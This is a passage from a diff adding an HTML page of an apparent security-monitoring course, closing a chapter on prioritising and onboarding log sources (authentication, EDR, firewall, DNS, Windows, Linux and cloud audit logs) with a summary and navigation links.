+                            Start with authentication logs (AD/Entra ID, VPN, SSO) because they detect the most common initial access techniques. Add firewall/proxy for network visibility into C2 and exfiltration. Include EDR alerts for endpoint threats. These three source types provide detection coverage for 70%+ of common attack patterns. Then add Windows Security logs, cloud audit logs, and DNS based on environment specifics.
+                        </p>
+                    </div>
+                </div>
+                
+                <h2 id="summary">Chapter Summary</h2>
+                
+                <ul>
+                    <li>Prioritize log sources by security value: authentication, EDR, firewall, DNS are typically P1</li>
+                    <li>Windows logs: Security events, PowerShell, and Sysmon provide comprehensive endpoint visibility</li>
+                    <li>Linux logs: auth.log/secure, syslog, and auditd for security monitoring</li>
+                    <li>Network devices: Firewall, proxy, and DNS logs reveal network-based attacks</li>
+                    <li>Cloud platforms: CloudTrail (AWS), Activity/Sign-in logs (Azure), Audit logs (GCP)</li>
+                    <li>Follow a structured onboarding process: Discovery → Planning → Implementation → Validation → Handoff</li>
+                </ul>
+                
+                <div class="page-navigation">
+                    <a href="1-2-architecture-components.html" class="nav-button prev">
+                        <span class="nav-button-icon">←</span>
+                        <div>
+                            <span class="nav-button-label">Previous</span>
+                            <span class="nav-button-title">Architecture & Components</span>
+                        </div>
+                    </a>
+                    <a href="1-4-log-parsing-normalization.html" class="nav-button next">
+                        <span class="nav-button-icon">→</span>
+                        <div>
+                            <span class="nav-button-label">Next</span>
+                            <span class="nav-button-title">Log Parsing & Normalization</span>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </main>
+    </div>
+    
+    <script src="main.js"></script>
+</body>
+</html>
